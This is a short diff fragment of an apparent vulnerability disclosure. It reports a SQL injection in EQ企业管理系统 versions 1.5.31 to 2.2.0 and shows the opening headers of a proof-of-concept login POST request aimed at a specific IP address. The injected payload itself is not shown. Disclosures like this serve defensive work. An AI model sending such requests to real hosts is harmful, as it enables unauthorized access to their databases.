@@ -10,7 +10,9 @@ Exploit Author:TLF
 analysis report: EQ企业管理系统 v1.5.31 to v2.2.0 was discovered to contain a SQL injection
 poc
 POST /Account/Login HTTP/1.1
+
 Host: 121.8.146.131
+
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
 Accept: application/json, text/javascript, /; q=0.01
 Accept-Language: en-US,en;q=0.5
